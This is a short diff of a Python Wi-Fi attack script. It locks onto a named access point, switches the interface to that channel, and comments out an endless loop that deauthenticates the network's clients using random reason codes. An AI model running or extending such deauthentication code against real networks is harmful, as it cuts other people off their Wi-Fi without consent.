@@ -31,18 +31,20 @@ AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE, specific_ap="Sams 9")
 
 print(AP_info)
 
-channel = AP_info.Channel
-BSSID = AP_info.index
+channel = AP_info.Channel[0]
+BSSID = AP_info.index[0]
 
+print(AP_info.Channel)
+print(BSSID[0])
 # change channel to be on APs channel
 os.system(f"iwconfig {INTERFACE} channel {channel}")
-clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
+# clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
 
-# Deauth clients
-while True:
-    print("Deauthenticating clients...")
-    reason_code = random.randint(1, 68)
-    deauth_clients(clients=clients, AP_mac=BSSID, reasoncode=reason_code)
+# # Deauth clients
+# while True:
+#     print("Deauthenticating clients...")
+#     reason_code = random.randint(1, 68)
+#     deauth_clients(iface=INTERFACE, clients=clients, AP_mac=BSSID, reasoncode=reason_code)
 
 
 
